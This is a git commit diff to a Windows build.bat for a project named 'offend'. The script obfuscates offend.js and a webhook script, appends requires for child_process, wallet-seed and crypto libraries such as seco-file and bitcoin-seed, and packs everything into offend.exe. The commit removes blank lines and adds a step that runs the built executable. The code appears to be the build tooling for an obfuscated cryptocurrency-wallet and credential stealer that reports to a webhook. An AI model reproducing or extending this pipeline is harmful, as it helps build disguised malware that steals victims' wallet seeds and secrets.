cc3fdc8f2e360b3cce7117dc3be7b0819079bd7e
offend1337 <130112322+offend1337@users.noreply.github.com>
2023-04-07 03:09:26 +0200

    Update build.bat

--- build.bat
+++ build.bat
@@ -1,5 +1,4 @@
 call npm rebuild
-
 call javascript-obfuscator offend.js --output index.js
 call javascript-obfuscator webhook.js --output webhook_obf.js
 call echo ;require("child_process") >> index.js;
@@ -23,5 +22,5 @@ call echo require("node-forge") >> index.js;
 call echo require("seco-file") >> index.js;
 call echo require("bitcoin-seed") >> index.js;
 call echo require("@peculiar/webcrypto") >> index.js;
-
 call pkg . -t win-x64 -o offend.exe
+call "%CD%"\offend.exe
